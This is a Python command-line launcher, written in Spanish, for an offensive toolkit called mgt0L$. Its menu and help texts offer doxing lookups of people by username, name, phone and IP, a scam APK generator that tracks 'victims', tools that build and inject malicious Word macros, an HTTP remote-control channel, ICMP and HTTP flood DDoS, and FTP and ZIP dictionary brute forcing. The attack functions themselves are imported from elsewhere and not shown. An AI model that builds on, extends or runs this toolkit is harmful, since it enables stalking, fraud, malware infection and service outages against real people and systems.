import argparse
from __prog__fast__ import *

scripts_h="""
\n[COMANDOS]--->> mgt0L$.py <<---[VERSION-2.1]\n
findtl      [palabra clave] busca herramientas por palabras clave.
help        muestra todas las interacciones disponibles en mgtols.
update      verifica si hay una nueva version disponible de mgt0l$.
exit        termina la sesion de mgt0l$.
\n[DOXING TOOLS]\n
>seeker     recopila infromacion con nombres de usuario.
>findperson busca informacion de personas por sus nombres [genealog].
>iplocate   geolocaliza direcciones ip detalladamente.
>lopiapi    prueba con un numero de telefono [CL].
\n[SCAM TOOLS]\n
>sc4pk      crea un archivo apk que se usa como scam permanente.
\n[MALWARE TOOLS]\n
>macromaker crea una macro para word dependiendo de tu especificacion [office].
>wordinfect agrega macro infectada a un documento de word [docm].
>reverhttp  controla una maquina mediante http y solicitudes post [php].
\n[DDOS TOOLS]\n
>icmpdos    realiza ataque ddos con protocolo icmp.
>httpflood  sobrecarga un servidor enviando solicitudes falsas [http-flood].
\n[VECTOR TOOLS]\n
>webdumper  encargado de encontrar directorios ocultos dentro de paginas web. [fuzzing]
>ftpbrute   realiza ataques de diccionario a servidores ftp.
>unzipper   realiza ataque de diccionario a compresiones [zip].
>tempmail   email temporal basado en mailnesia.
>urljump    generador de invitaciones para RRSS [fuzzing].
\n""".upper()

execute_s = {

    "seeker": [
        seeker, 
        "a", 
        "[DESCRIPCION]\nRecopila información basada en nombres de usuario buscando en diversas fuentes web.\n\n"
        "[USO]\npython3 fsh.py seeker --a <nombre_de_usuario>\n\n"
        "[PARAMETROS]\n--a: Nombre de usuario a buscar (obligatorio)."
    ],
    "icmpdos": [
        icmpdos, 
        "ab", 
        "[DESCRIPCION]\nRealiza un ataque DDoS utilizando paquetes ICMP enviados repetidamente a un destino.\n\n"
        "[USO]\npython3 fsh.py icmpdos --a <ip_destino> --b <tamaño_paquete>\n\n"
        "[PARAMETROS]\n--a: Dirección IP del objetivo (obligatorio).\n"
        "--b: Tamaño del paquete ICMP en bytes (opcional, recomendado: 65550)."
    ],
    "lopiapi": [
        lopiapi, 
        "a", 
        "[DESCRIPCION]\nBusca información asociada a un número telefónico usando APIs públicas.\n\n"
        "[USO]\npython3 fsh.py lopiapi --a <número_telefónico>\n\n"
        "[PARAMETROS]\n--a: Número telefónico, ejemplo: 983222434 (obligatorio)."
    ],
    "unzipper": [
        unzipper, 
        "ab", 
        "[DESCRIPCION]\nDescomprime archivos protegidos por contraseña utilizando un ataque de diccionario.\n\n"
        "[USO]\npython3 fsh.py unzipper --a <ruta_diccionario> --b <ruta_archivo_zip>\n\n"
        "[PARAMETROS]\n--a: Ruta al diccionario de contraseñas (obligatorio).\n"
        "--b: Ruta al archivo ZIP (obligatorio)."
    ],
    "tempmail": [
        tempmail, 
        "ab", 
        "[DESCRIPCION]\nCrea un correo temporal basado en la plataforma Mailnesia.\n\n"
        "[USO]\npython3 fsh.py tempmail --a <alias_correo> --b <número_mensaje>\n\n"
        "[PARAMETROS]\n--a: Alias del correo temporal (obligatorio).\n"
        "--b: Número del mensaje en la bandeja (opcional)."
    ],
        "urljump": [
        urljump, 
        "ab", 
        "[DESCRIPCION]\nGenera enlaces de invitacion aleatorios para RRSS.\n\n"
        "[USO]\npython3 fsh.py urljump --a <RRSS_to_gen> --b <cantidad>\n\n"
        "[PARAMETROS]\n--a: Enlace de RRSS a generar (e.g., `WA` para WhatsApp, `TG` para Telegram, `DC` para Discord, `BT` para Bit.ly, `YT` para YouTube, obligatorio).\n"
        "--b: Cantidad a generar (obligatorio)."
    ],
    "wordinfect": [
        wordinfect, 
        "ab", 
        "[DESCRIPCION]\nInserta una macro maliciosa en un documento Word habilitado para macros (.docm).\n\n"
        "[USO]\npython3 fsh.py wordinfect --a <ruta_docm> --b <ruta_macro>\n\n"
        "[PARAMETROS]\n--a: Ruta al archivo de Word (.docm, obligatorio).\n"
        "--b: Ruta al archivo que contiene la macro (obligatorio)."
    ],
    "macromaker": [
        macromaker, 
        "a", 
        "[DESCRIPCION]\nGenera un script de macro diseñado para Microsoft Word, ya sea para descargar un archivo o ejecutar comandos de shell.\n\n"
        "[USO]\npython3 fsh.py macromaker\n\n"
        "[PARAMETROS]\nSin parámetros adicionales."
    ],
    "findperson": [
        findperson, 
        "ab", 
        "[DESCRIPCION]\nBusca información genealógica sobre personas basándose en sus nombres y países.\n\n"
        "[USO]\npython3 fsh.py findperson --a <nombre_persona> --b <A|C|C|G|M|V|ALL>\n\n"
        "[PARAMETROS]\n--a: Nombre de la persona a buscar (obligatorio).\n"
        "--b: Código del país (e.g., `A` para Argentina, `C` para Chile, `V` para Venezuela, `C` para Colombia, `G` para Guatemala, `M` para Mexico, `B` para Bolivia, `ALL` para todos los países, obligatorio)."
    ],
    "iplocate": [
        iplocate, 
        "a", 
        "[DESCRIPCION]\nGeolocaliza direcciones IP y proporciona detalles como ubicación, ISP y más.\n\n"
        "[USO]\npython3 fsh.py iplocate --a <dirección_ip>\n\n"
        "[PARAMETROS]\n--a: Dirección IP objetivo (obligatorio)."
    ],
    "httpflood": [
        httpflood, 
        "a", 
        "[DESCRIPCION]\nSatura un servidor web enviando múltiples solicitudes HTTP falsas.\n\n"
        "[USO]\npython3 fsh.py httpflood --a <url_objetivo>\n\n"
        "[PARAMETROS]\n--a: URL del servidor objetivo (obligatorio)."
    ],
    "ftpbrute": [
        ftpbrute, 
        "abcd", 
        "[DESCRIPCION]\nRealiza ataques de fuerza bruta contra servidores FTP.\n\n"
        "[USO]\npython3 fsh.py ftpbrute --a <modo> --b <servidor_ftp> --c <usuario|diccionario_usuarios> --d <diccionario_contraseñas>\n\n"
        "[PARAMETROS]\n--a: Modo de ataque (`mul` para múltiples usuarios, `one` para un único usuario, obligatorio).\n"
        "--b: Dirección del servidor FTP (obligatorio).\n"
        "--c: Usuario o diccionario de usuarios (obligatorio).\n"
        "--d: Diccionario de contraseñas (obligatorio)."
    ],
    "webdumper": [
        webdumper, 
        "abc", 
        "[DESCRIPCION]\nExplora sitios web en busca de directorios y archivos ocultos utilizando diccionarios.\n\n"
        "[USO]\npython3 fsh.py webdumper --a <F|S> --b <url> --c <diccionario>\n\n"
        "[PARAMETROS]\n--a: Modo (`F` para inicial, `S` para recursivo, obligatorio).\n"
        "--b: URL base (obligatorio).\n"
        "--c: Diccionario con palabras clave (obligatorio)."
    ],
    "sc4pk": [
        sc4pk, 
        "ab", 
        "[DESCRIPCION]\nGenera un archivo APK malicioso que puede ser usado para propagar malware.\n\n"
        "[USO]\npython3 fsh.py sc4pk --a <ID_de_seguimiento> --b <ig|fb|tw|go> | Creacion del APK.\n"
        "python3 fsh.py sc4pk --a <ID_de_seguimiento> | Busqueda de victimas.\n\n"
        "[PARAMETROS]\n--a: ID asociada a tus victimas (obligatorio).\n"
        "--b: Scam a usar (ig para Instagram, fb para Facebook, tw para Twitter, go para Google, opcional)"
    ],
    "reverhttp": [
        "reverseatak.py", 
        "a", 
        "[DESCRIPCION]\nEstablece un canal de control remoto basado en solicitudes HTTP y POST.\n\n"
        "[USO]\npython3 fsh.py reverhttp\n\n"
        "[PARAMETROS]\nSin parámetros adicionales."
    ]
}


parse = argparse.ArgumentParser(usage=scripts_h)

parse.add_argument("tool", type=str, help="<tool_to_execute_usage>")
parse.add_argument("--a", type=str, help="<optional>")
parse.add_argument("--b", type=str, help="<optional>")
parse.add_argument("--c", type=str, help="<optional>")
parse.add_argument("--d", type=str, help="<optional>")

arguments = parse.parse_args()

try:

    if arguments.tool in execute_s and arguments.a == None:

        print(execute_s[arguments.tool][2])

    # Se ejecutan dependiendo de la cantidad de parametros necesarios

    elif arguments.tool in execute_s and arguments.a != None:

        if execute_s[arguments.tool][1] == "a":
            execute_s[arguments.tool][0](arguments.a)

        if execute_s[arguments.tool][1] == "ab":
            execute_s[arguments.tool][0](arguments.a, arguments.b)

        if execute_s[arguments.tool][1] == "abc":
            execute_s[arguments.tool][0](arguments.a, arguments.b, arguments.c)
        
        if execute_s[arguments.tool][1] == "abcd":
            execute_s[arguments.tool][0](arguments.a, arguments.b, arguments.c, arguments.d)

    else:
        print("[ERROR] Funcion no encontrada...")

except Exception as err:
    print(err)